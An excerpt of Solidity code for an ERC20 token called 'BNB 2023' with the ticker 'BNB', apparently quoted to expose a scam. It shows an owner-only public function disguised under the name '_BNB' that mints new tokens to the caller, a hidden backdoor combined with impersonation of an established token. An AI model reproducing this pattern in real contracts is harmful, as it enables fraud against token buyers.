...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BNB(uint256 amount) public onlyOwner {
 _BNB(msg.sender, amount);
    }
    ...
    function _BNB(address account, uint256 amount) internal virtual {
...
contract $BNB2023 is ERC20 {
    ...
    constructor() public ERC20("BNB 2023", "BNB") {
     _BNB(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}